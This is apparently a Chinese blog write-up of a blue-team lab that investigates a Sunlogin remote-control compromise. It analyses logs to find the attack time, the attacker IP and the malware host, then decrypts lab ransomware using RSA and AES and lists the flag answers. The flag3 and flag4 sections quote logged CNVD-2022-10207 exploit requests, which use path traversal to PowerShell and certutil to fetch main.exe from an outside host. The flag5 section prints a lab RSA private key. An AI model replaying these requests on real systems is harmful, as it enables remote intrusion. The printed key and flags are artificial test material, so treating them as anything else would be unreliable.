---
title: 【玄机靶场】第四章 windows 实战-向日葵
date: 2025-09-05
categories:
  - 靶场
  - 蓝队
image: images/40.webp
---
# 简介
第四章 windows实战
Administrator xj@123456
# flag1
**通过本地 PC RDP到服务器并且找到黑客首次攻击成功的时间为多少,将黑客首次攻击成功的时间为作为 FLAG 提交(2028-03-26 08:11:25.123);**
1.获取向日葵日志文件：
![Pasted image 20250325135003](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250325135003.png)
然后一个一个进行排查，发现sunlogin_service.20240321-191046文件内容比较多，拖出来进行分析：
先排查一下日志文件中有多少IP地址,每个IP有多少条日志：
```php
grep -oE '\b([0-9]{1,3}\.){3}[0-9]{1,3}\b' xrk.log | sort | uniq -c
```
![Pasted image 20250325135111](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250325135111.png)
```
      2 0.0.0.0           
      2 1.1.1.1           
      4 127.0.0.1         
      2 127.1.1.1         
    594 192.168.31.114    
   1696 192.168.31.45     
      1 192.168.52.150    
   1651 47.111.107.239    
   1660 47.111.169.221    
      1 47.111.228.106
```
排除掉一些默认地址，然后一个IP一个IP进行查。
发现192.168.31.45有很多恶意的访问路径。
分析下来发现是尝试在利用CNVD-2022-10207：向日葵远程控制软件 RCE 漏洞。
**CNVD-2022-10207** 漏洞是一种远程命令执行漏洞，存在于向日葵远程控制软件中。攻击者可以通过特制的 HTTP 请求利用此漏洞，执行任意命令或代码。
```php
grep  "192.168.31.45" xrk.log
```
![Pasted image 20250325135521](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250325135521.png)
提取时间：
flag
```
flag{2024-03-26 10:16:25.585}
```
# flag2
**通过本地 PC RDP到服务器并且找到黑客攻击的 IP 为多少,将黑客攻击 IP 作为 FLAG 提交;**
根据flag1,可以看出黑客IP为：192.168.31.45
flag
```php
flag{192.168.31.45}
```
# flag3
**通过本地 PC RDP到服务器并且找到黑客托管恶意程序 IP 为,将黑客托管恶意程序 IP 作为 FLAG 提交;**
根据日志信息，可以看出：
![Pasted image 20250325140253](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250325140253.png)
![Pasted image 20250325140213](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250325140213.png)
```
192.168.31.45:49329,/check?cmd=ping../../../../../../../../../windows/system32/WindowsPowerShell/v1.0/powershell.exe certutil -urlcache -split -f http://192.168.31.249/main.exe, plugin:check, session:sobGzXzWBfSlSbdqnmkUbJMLEjhssRx1
```
- **恶意活动指示**：
    - **路径遍历**：`/check?cmd=ping....` 是一种路径遍历尝试，试图访问系统中的`powershell.exe`。
    - **命令执行**：使用 `certutil` 工具下载文件 `main.exe`。
    - **外部IP**：下载源 `http://192.168.31.249/main.exe` 指向一个可能托管恶意程序的外部服务器。
- **恶意程序下载**：
    - **工具使用**：`certutil` 是一个合法的Windows工具，但在这里被用于下载恶意文件，这是一个常见的攻击模式。
    - **下载目标**：目标文件 `main.exe` 可能是恶意程序。
flag
```
flag{192.168.31.249}
```
# flag4
**找到黑客解密 DEC 文件,将黑客DEC 文件的 md5 作为 FLAG 提交;**
从日志里找一下DEC，看有没有信息
![Pasted image 20250325140738](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250325140738.png)
但并没有找到这个文件信息。但是我们看日志，发现一个qq.txt文件。
![Pasted image 20250325140823](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250325140823.png)
```
2024-03-26 10:39:11.031 - Info  -       [Acceptor][HTTP] new RC HTTP connection 192.168.31.45:49884, path: /check?cmd=ping../../../../../../../../../windows/system32/WindowsPowerShell/v1.0/powershell.exe echo 647224830 > qq.txt, version: HTTP/1.1
```
搜索QQ群，发现了玄机的靶场群。
![Pasted image 20250325140923](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250325140923.png)
![Pasted image 20250325141055](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250325141055.png)
找到文件：
使用命令，对文件进行MD5加密
```
md5sum DEC.pem
```
![Pasted image 20250325141149](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250325141149.png)
flag
```
flag{5ad8d202f80202f6d31e077fc9b0fc6b}
```
# flag5
**通过本地 PC RDP到服务器并且解密黑客勒索软件,将桌面加密文件中关键信息作为 FLAG 提交;**
**先使用RSA解到密钥：**
Flag4的DEC.pem文件就是rsa的私钥，不过格式需要稍加修改，将Private key改成大写即可
PEM格式密钥：
```
-----BEGIN RSA PRIVATE KEY-----
MIICXQIBAAKBgQDWQqpkHRKtRu66MjTrNZC13A6rIlGaJBd/FYBy4ifiITasCnQE
J9aRTIYQsM5iincecnvY8xGYMg5pVTp6P4fxS4/+1bAEciRXSTCmLI8FeDd3sjOc
HTw82sG0hfnnb0b/LFhbOCk7BgLnpwvSy5za/dtVQFSDbQbQuTBp029AKwIDAQAB
AoGBAKh6952NtvgGhQZpIG+sSUSX6/jqHZzFsKw/7idoatBIKcOS3LO/19udfvZ0
8XVPSGfqwjRQvo8dHXP6juc+Odg1XOLPw4fjjJz9b9dLKCKwtIU3CwA1AmuhYNGp
1OXlHLyUaNVTN3TZN9Dn7txD4gOvLIirqbmhzy/N7PdPF5ThAkEA4MB++5DSY7Kv
MO1uHuxTr/jRy6754Mzgo0fpLBXSB13/nLMxRA6QEbigoAFpsFd36EYMKzftbezB
gx2nphvLUwJBAPQMv730MqCWjaCPLgYRV+oMU6OnOMs6+ALql+I1eVqVfBAt+5De
HMxY7mWdaR9pofzuz+6KkmwRHqKSVw45dMkCQFJ68l76B+vkoFxxVe9tRU0YIE4C
mdtA9NOXSWAPZfOkMHFeZZ8XRRHr0q7FtfasMuoAAuk9bhngQCgREvxnyNcCQGnt
trQecHMfpe2Q+CsOEBi4rP0VsiMUP14UsUQwbbIRvD3Rl6WzotBXsXJNtrk5wmPk
zD//ybo6XA+4cSztZ3ECQQC92ck1XJm7V12SOFqHcNXFoS8tFvgNQXNEahmhJ2wb
xTo0VwUhCeG1n8X5PqRn6Rcsh8YQAt924YrWtcTxrg8g
-----END RSA PRIVATE KEY-----
```
要加密的内容
![Pasted image 20250325142957](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250325142957.png)
```
N2xTZ2Bsn2Y5lve7KZ36bgsFjqncBs55VO0zkeEIr5Iga/kbegA0BAstotBWnZ16+trNfkzl3apUobodMkC8covEo22p+kWAyVjMRyJ98EQ4Pspr/Y5HIuH0xuvPa82j7b0AMJHkyd2viuymI/mrxjJk2X0xlEE4YVioMLd22+w=
```
![Pasted image 20250325142846](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250325142846.png)
解密：
```
NXVJSTQUAPGTXKSX
```
**然后再AES解密：**
需要解密的内容：
```
0sWK8adKSGh1Xaxo6n1mZFoyNDYVokXwkBhxnzxU+MEJIV44u48SdOiFzWLn849hObaP6z26lLtMnXaDUnAPuMh+nF2hw9RoAsur7KYxE8/iY/y4jOEBsHT5wvQldcNfntrDyMUCvrWTUHl2yapUmaIIf2rZsNsqMVJ9puZzp58+FJmulyC7R1C2yoP1jHhsdOkU7htbzUWWsm2ybL+eVpXTFC+i6nuEBoAYhv2kjSgL8qKBFsLKmKQSn/ILRPaRYDFP/srEQzF7Y4yZa4cotpFTdGUVU547Eib/EaNuhTyzgOGKjXl2UYxHM/v0c3lgjO7GDA9eF3a/BBXPAgtK126lUfoGK7iSAhduRt5sRP4=
```
密钥：
```
NXVJSTQUAPGTXKSX
```
iv偏移量是16个0
![Pasted image 20250325143151](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250325143151.png)
获得答案：
```
@suanve
时间是连续的，年份只是人类虚构出来用于统计的单位，2024年第一天和2023年最后一天，
不会有任何本质区别。你的花呗，你的客户,你的体检报告，窗外的寒风，都不会因为这是新的一年，
而停下对你的毒打。
GIVE YOU FLAG!!!!!
flag{EDISEC_15c2e33e-b93f-452c-9523-bbb9e2090cd1}
```
flag
```php
flag{EDISEC_15c2e33e-b93f-452c-9523-bbb9e2090cd1}
```